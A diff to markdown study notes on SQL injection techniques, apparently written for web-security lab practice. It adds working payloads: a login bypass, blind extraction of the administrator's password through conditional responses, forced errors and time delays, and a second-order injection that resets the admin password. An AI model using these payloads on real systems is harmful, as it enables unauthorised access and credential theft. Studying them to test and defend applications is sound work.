@@ -33,10 +33,19 @@ Attack (POST Method): username=administrator'--&password=123
 Backend Query: `SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '{}'`  
 
 **Techniques**  
-1. Conditional Responses (observable difference in response)  
+1. Conditional Responses  
+possible due to observable difference in response  
 `' AND '1'='1`  
 `' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'a`  
 2. Conditional Responses by triggering SQL errors  
+possible due to mishandling of SQL errors  
 `'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'` (check if username 'administrator' exists)  
 `'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`  
 3. Time Delays  
+possible due to synchronous processing of SQL queries  
+**MySQL:** `'; IF (1=1) SELECT SLEEP(10)--`  
+
+### Second-order SQLi
+Input is safely handled initially and stored in database, but when data is later accessed and processed...   
+*Username:* `badguy'; UPDATE users SET password='letmein' WHERE user='administrator'--`
+Backend Query: `SELECT * from user_options WHERE username='{}'`
